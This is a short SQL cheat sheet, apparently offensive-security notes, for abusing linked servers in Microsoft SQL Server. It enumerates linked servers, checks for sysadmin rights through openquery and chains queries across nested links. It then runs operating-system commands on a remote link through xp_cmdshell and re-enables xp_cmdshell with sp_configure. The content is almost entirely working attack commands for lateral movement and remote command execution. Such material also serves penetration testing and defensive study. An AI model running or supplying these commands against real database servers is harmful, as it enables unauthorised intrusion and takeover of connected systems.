
-- List linked servers
sp_linkeservers
SELECT srvname FROM master..sysservers

-- Query an existing link using multipart name
select name FROM [linkedserver].master.sys.databases

-- Query an existing link using openquery
SELECT version FROM openquery("linkedserver", 'select @@version as version');
SELECT * FROM openquery(Server1, 'select @@servername')
SELECT * FROM openquery(Server1, 'select SYSTEM_USER')
SELECT * FROM OPENQUERY("server1",'SELECT is_srvrolemember(''sysadmin'')')
SELECT * FROM OPENQUERY("server1",'SELECT srvname FROM master..sysservers')

-- Query a nested link
-- Note:  double number of ' with each nesting
select version from openquery("link1",'select version from openquery("link2",''select @@version as version'')')

-- Execute xp_cmdshell through a link
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell ''dir c:''')

-- If needed, enabled xp_cmdshell on link (requires link to be configured with sysadmin)
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
